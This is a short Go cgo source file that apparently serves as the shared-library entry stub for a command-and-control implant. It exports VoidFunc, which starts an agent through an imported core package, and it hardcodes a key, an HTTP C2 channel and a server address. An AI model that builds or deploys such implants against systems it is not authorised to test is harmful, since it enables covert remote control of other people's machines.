// +build cgo

package main

import "C"
import (
	"../core"
)

var (
	key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
	server = "http://localhost:8888"
	c2Name = "HTTP"
	c2Key = ""
)

//export VoidFunc
func VoidFunc() {
	c2Config := map[string]string{"c2Name": c2Name, "c2Key": c2Key}
	core.Core(server, 0, nil, c2Config, false)
}

func main() {}
